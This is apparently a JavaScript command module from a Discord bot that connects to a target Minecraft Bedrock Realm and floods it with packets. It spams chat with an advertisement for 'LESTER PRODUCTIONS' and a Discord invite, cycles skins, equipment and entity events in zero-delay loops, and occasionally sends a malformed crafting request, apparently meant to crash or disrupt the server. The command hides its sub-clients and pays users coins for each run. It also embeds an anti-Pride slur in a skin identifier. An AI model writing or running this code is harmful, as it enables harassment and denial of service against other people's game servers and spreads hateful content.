"use strict";

const bpClient = require("../../common/Client.js");
const RealmAPI = require("../../common/Realm.js");

const { translateDisconnectMessage, cleanLeftovers } = require("../../common/Util.js");
const { v4fast: v4 } = require('uuid-1345');

const CoinHandler = require("../../classes/CoinSystem.js");

const map = new Map();

module.exports = {
  name: "do-all",
  description: 'DO EVERYTHING!',
  dontUseDB: false, // ONLY USE IF IT DOESN'T REQUIRE ANY DATABASE CHANGES / MINECRAFT OR XBOX RELATED LINK COMMANDS
  requireLink: true,
  cooldown: 15000,
  options: [
    {
      type: 3,
      name: "input",
      description: "Realm Code or ID",
      required: true,
      min_length: 5,
      max_length: 15
    },
    {
      type: 4,
      name: "time",
      description: "Duration",
      required: true,
      min_value: 1,
      max_value: 180
    },
    {
      type: 5,
      name: "hmain",
      description: "Hide the main from doing certain operations",
      required: true
    }
  ],
  execute: async (interaction, args, dbUser, embed, clearCooldown) => {
    const { input, time, hmain } = args;
    const { user } = interaction;

    let address = {};

    switch (map.get(user.id)) {
      case 64:
        map.delete(user.id)
        break;
      default:
        if (map.get(user.id)) {
          embed.description = `You're already doing this.`;
          interaction.createFollowup({ embed });
          return clearCooldown();
        }
        break;
    }

    let RAPI = new RealmAPI(user.id);
    let realm = /^\d+$/.test(input) ? await RAPI.getRealmInfoByID(input) : await RAPI.getRealmInfo(input);

    embed.title = "Operation";
    embed.fields = [
      {
        id: 0,
        name: "Connection",
        value: ":yellow_circle:",
        inline: true
      },
      {
        id: 1,
        name: "Operation",
        value: ":red_circle:",
        inline: true
      }
    ];

    if (realm.status) {
      switch (realm.status) {
        case 403:
        case 404:
        case 429:
        case 500:
        case 1403:
        case 1429:
        case 1500:
          embed.description = `Operation failed\nInput: **${input}**\n${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realm.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await interaction.createFollowup({ embed });
    }

    embed.description = `Realm Name: **${realm.name}**\nInput: **${input}**`;

    const msg = await interaction.createFollowup({ embed });

    map.set(user.id, 1);

    if (realm.expired || realm.state === "CLOSED") {
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nRealm is ${realm.expired ? "expired" : "closed"}.`;

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed });
    }

    let realmIP = await RAPI.getRealmIP(realm.id);

    if (realmIP.status) {
      switch (realmIP.status) {
        case 403:
        case 404:
        case 500:
        case 1429:
          embed.description = `Operation failed\nInput: **${input}**\n${realmIP?.body?.errorMsg} (${realmIP?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realmIP.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed });
    }

    switch (realmIP.networkProtocol) {
      case "NETHERNET":
      case "NETHERNET_JSONRPC":
        address.networkId = realmIP.address;
        break;
      case "DEFAULT":
        address.ip = realmIP.address?.substring(0, realmIP.address.indexOf(':'));
        address.port = Number(realmIP.address?.substring(realmIP.address.indexOf(':') + 1));
        break;
      default:
        embed.description = `Operation failed\nInput: **${input}**\nUnsupported Network Protocol: **${realmIP.networkProtocol}**`;

        embed.fields[0].value = ":red_circle:";

        map.delete(user.id);

        return await msg.edit({ embed });
    }

    let configuration = {
      ssbp: { enabled: false, type: NaN },
      transport: realmIP.networkProtocol
    };

    const client = await new bpClient(address, dbUser, realm, configuration).connect();

    let clientValue = "";
    if (typeof client === "string") {
      switch (client) {
        case "No IP":
        case "No Port":
        case "Bad IP":
        case "Bad Port":
          clientValue = `Invaild IP/Port has been provided. (${client})`;
          break;
        case "No Nethernet Network ID":
        case "Bad Nethernet Network ID":
          clientValue = `Invaild Nethernet Network ID has been provided. (${client})`;
          break;
        case "Unsupported Network Protocol":
          clientValue = `The provided Network Protocol is unsupported.`;
          break;
        case "Concurrent Operation":
          clientValue = `Someone else is currently doing a operation on this realm right now. Please try again later.`;
          break;
        case "Currently Doing Operation":
          clientValue = `You're already doing a operation on a realm right now. Please wait until that finishes before you do another one.`;
          break;
        default:
          clientValue = `Failed to connect to the realm for an unknown reason. Please try again later or ask the developer(s) for more information. (${client})`;
          break;
      }

      map.delete(user.id);

      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

      embed.fields[0].value = ":green_circle:";

      embed.fields.push({
        id: 2,
        name: "Reason",
        value: clientValue,
        inline: true
      })

      return await msg.edit({ embed, components: [] });
    }

    embed.fields[0].value = ":green_circle:";
    embed.fields[1].value = ":yellow_circle:";

    embed.description = `Started a operation on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

    await msg.edit({
      embed, components: [{
        type: 1,
        components: [
          {
            type: 2,
            label: "End",
            style: 4,
            custom_id: "end"
          }
        ]
      }]
    })

    const CHandler = new CoinHandler(interaction, dbUser);
    CHandler.start();

    let interval, intervals = [], timeout, items = [], interval2 = setInterval(async () => {
      if (map.get(user.id) === 64) {
        cleanLeftovers([interval, interval2, ...intervals], [timeout]);
        embed.fields[1].value = ":octagonal_sign:";
        embed.description = `Operation cancelled on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`

        client.disconnect();
        map.delete(user.id);

        const reward = await CHandler.reward();

        embed.description += `\nCoins Earned: **${reward}**`;

        return await msg.edit({ embed, components: [] })
      }
    });

    client.on("disconnect_1", async (packet) => client.emit("kick", { ...packet, isSubClient: true }))

    client.on("kick", async (packet) => {
      if (!map.get(user.id)) return;

      if (typeof packet.isSubClient === "boolean" && packet?.isSubClient && packet.reason != "server_full") return;

      cleanLeftovers([interval, interval2, ...intervals], [timeout]);
      map.delete(user.id);

      embed.fields[1].value = ":red_circle:";
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

      if (packet.message.includes("/multiplayer/bedrock/authentication")) {
        packet.message = "Banned from Minecraft Multiplayer";
        await RAPI.cleanLinkData("Banned from Minecraft Multiplayer", false);
      }

      // I don't want to have multiple embed.fields = []s again
      embed.fields.push({
        id: 2,
        name: "Reason",
        value: translateDisconnectMessage(packet),
        inline: true
      })

      const reward = await CHandler.reward();

      embed.description += `\nCoins Earned: **${reward}**`;

      return await msg.edit({ embed, components: [] });
    })

    client.on("item_registry", (packet) => {
      for (const item of packet.itemstates) items.push(item.runtime_id);
    })

    let CSCConfig = {
      ssbp: { enabled: false, type: 0 },
      batchOptions: { enabled: false, count: NaN },
      listeners: { enabled: true },
      name: { enabled: true, value: "§4§lLESTER PRODUCTIONS ©" },
    }

    const config = { batchOptions: { enabled: false, count: 1 } };
    const uuids = []

    let play_fab_id = client.options.skinData.PlayFabId
    let no_persona = require('../../ext/skin_change_no_persona.json')
    let skin_id = `${v4()}.FuckPrideMonth`

    no_persona = {
      ...no_persona,
      play_fab_id,
      skin_id,
      full_skin_id: skin_id,
      skin_resource_pack: no_persona.skin_resource_pack.replaceAll("humanoid.customSlim", skin_id),
      geometry_data: no_persona.geometry_data.replaceAll("humanoid.customSlim", skin_id)
    }

    const plrListHandler = (packet, index) => {
      for (const player of packet.records.records) {
        if (
          typeof player.is_subclient != "boolean" ||
          typeof player.username != "string"
        ) continue;

        if (
          !uuids.includes(player.uuid) &&
          player.username.includes("LESTER PRODUCTIONS") &&
          player.username.includes(`(${index})`) &&
          player.is_subclient
        ) {
          uuids.push(player.uuid)
        }
      }
    }

    const command = `me §r§l\n\n\n\n   §9LESTER PRODUCTIONS ©\n   §9discord.gg/c5rHxJ3sr8\n\n\n` /* + `\n` */;

    const startGameHandler = (packet, index) => {
      const runtime_entity_id = packet.runtime_entity_id

      let pktentityevent = index === 0 ? "entity_event" : `entity_event_${index}`;
      let pktmobequip = index === 0 ? "mob_equipment" : `mob_equipment_${index}`;
      let plrSkinPktName = index === 0 ? "player_skin" : `player_skin_${index}`;
      let pktplayeraction = index === 0 ? "player_action" : `player_action_${index}`;
      let itemStackReq = index === 0 ? "item_stack_request" : `item_stack_request_${index}`;

      const playerAction = {
        runtime_entity_id: packet.runtime_entity_id,
        position: packet.player_position,
        result_position: packet.player_position,
        face: 0
      };

      let item = {};

      const nbt = {
        network_id: 264,
        count: 1,
        has_stack_id: 1,
        stack_id: 1,
        extra: {
          has_nbt: true,
          nbt: {
            version: 1,
            nbt: {
              type: "compound",
              name: "",
              value: {
                bundle_id: 1
              }
            }
          },
          can_place_on: [],
          can_destroy: []
        }
      };

      switch (index) {
        case 0:
          // Skip 1st sub client, we will save it because that's the way for it not to show the XUID.
          for (let i = 1; i < 3; i++) client.createSubClient(i, CSCConfig)

          // I'm too lazy to do this a different way, punish me later if I dont fix this - vision (12/21/25)
          if (!hmain) intervals.push(setInterval(() => {
            client.sendCommand(command, 5, 1, config)

            let network_id = items[~~(Math.random() * items.length)]
            let data = (network_id << 16) | 41248

            item = {
              network_id,
              count: 1,
              has_stack_id: 1,
              stack_id: 1,
              extra: {
                has_nbt: false,
                nbt: {},
                can_place_on: [],
                can_destroy: []
              }
            }

            client.write(pktentityevent, {
              runtime_entity_id,
              event_id: "eating_item",
              data
            })

            client.write(pktplayeraction, { ...playerAction, action: Math.random() < 0.5 ? 5 : 6 })

            client.write(plrSkinPktName, {
              uuid: client.profile.uuid,
              skin: no_persona,
              skin_name: no_persona.skin_id,
              old_skin_name: '',
              is_verified: true
            })

            if (Math.random() < 0.00001) {
              item.extra.has_nbt = true
              item.extra.nbt = {
                version: 1,
                nbt: {
                  type: "compound",
                  name: "",
                  value: {
                    bundle_id: 1
                  }
                }
              }
            }

            if (Math.random() < 0.000001) {
              client.write(itemStackReq, {
                requests: [
                  {
                    request_id: -67,
                    actions: [
                      {
                        type_id: "results_deprecated",
                        result_items: [nbt],
                        times_crafted: 67
                      }
                    ],
                    custom_names: [],
                    cause: 0
                  }
                ]
              })
            }

            client.write(pktmobequip, {
              runtime_entity_id,
              item,
              slot: 0,
              selected_slot: 0,
              window_id: Math.random() < 0.5 ? "inventory" : "offhand"
            })
          }, 0))
          break;
        case 1:
        case 2:
        case 3:
          // I'm too lazy to do this a different way, punish me later if I dont fix this - vision (12/21/25)
          intervals.push(setInterval(() => {
            client.sendCommand(command, 5, 1, config)

            let network_id = items[~~(Math.random() * items.length)]
            let data = (network_id << 16) | 41248

            item = {
              network_id,
              count: 1,
              has_stack_id: 1,
              stack_id: 1,
              extra: {
                has_nbt: false,
                nbt: {},
                can_place_on: [],
                can_destroy: []
              }
            }

            if (!hmain) {
              client.write(pktplayeraction, { ...playerAction, action: Math.random() < 0.5 ? 5 : 6 })

              client.write(plrSkinPktName, {
                uuid: uuids[index - 1],
                skin: no_persona,
                skin_name: no_persona.skin_id,
                old_skin_name: '',
                is_verified: true
              })
            }

            client.write(pktentityevent, {
              runtime_entity_id,
              event_id: "eating_item",
              data
            })

            if (Math.random() < 0.00001) {
              item.extra.has_nbt = true
              item.extra.nbt = {
                version: 1,
                nbt: {
                  type: "compound",
                  name: "",
                  value: {
                    bundle_id: 1
                  }
                }
              }
            }

            if (Math.random() < 0.000001) {
              client.write(itemStackReq, {
                requests: [
                  {
                    request_id: -67,
                    actions: [
                      {
                        type_id: "results_deprecated",
                        result_items: [nbt],
                        times_crafted: 67
                      }
                    ],
                    custom_names: [],
                    cause: 0
                  }
                ]
              })
            }

            client.write(pktmobequip, {
              runtime_entity_id,
              item,
              slot: 0,
              selected_slot: 0,
              window_id: Math.random() < 0.5 ? "inventory" : "offhand"
            })
          }, 0))
          break;
      }
    }

    ["player_list_1", "player_list_2", "player_list_3"].forEach((value, index) => {
      client.on(value, (packet) => plrListHandler(packet, index));
    });

    ["start_game", "start_game_1", "start_game_2", "start_game_3"].forEach((value, index) => {
      client.once(value, (packet) => startGameHandler(packet, index))
    });

    timeout = setTimeout(async () => {
      client.disconnect();
      map.delete(user.id);
      cleanLeftovers([interval, interval2, ...intervals], [timeout]);

      embed.fields[1].value = ":green_circle:"

      const reward = await CHandler.reward();

      embed.description += `\nCoins Earned: **${reward}**`;

      return await msg.edit({ embed, components: [] });
    }, time * 1000)
  },
  componentPressEvent: cancel
};

async function cancel(interaction) {
  const { user } = interaction;

  map.set(user.id, 64)

  await interaction.acknowledge();
}